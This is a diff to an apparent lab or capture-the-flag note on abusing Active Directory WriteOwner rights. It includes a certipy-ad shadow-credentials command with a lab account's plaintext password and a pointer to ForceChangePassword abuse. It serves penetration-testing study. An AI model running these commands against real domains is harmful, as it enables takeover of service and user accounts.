@@ -4,7 +4,7 @@ This ACL allows a user to change the owner of an Active Directory object.
 ---
 ## Remotely
 
-#### Write on Service Account
+#### Write on Service Account & Domain User
 
 1. Becoming the owner of service account "ca_svc". Now user "ryan" (current user) owns this service account.
 
@@ -23,6 +23,10 @@ This ACL allows a user to change the owner of an Active Directory object.
 ```
 certipy-ad shadow auto -username ryan@sequel.htb -password WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.129.232.128 
 ```
+
+4. or abuse any other ACL like [ForceChangePassword](ForceChangePassword.md)
+
+---
 #### Write on Group
 
 1. Utilize impacket-owneredit to modify the owner of the AD Object (Management Group)
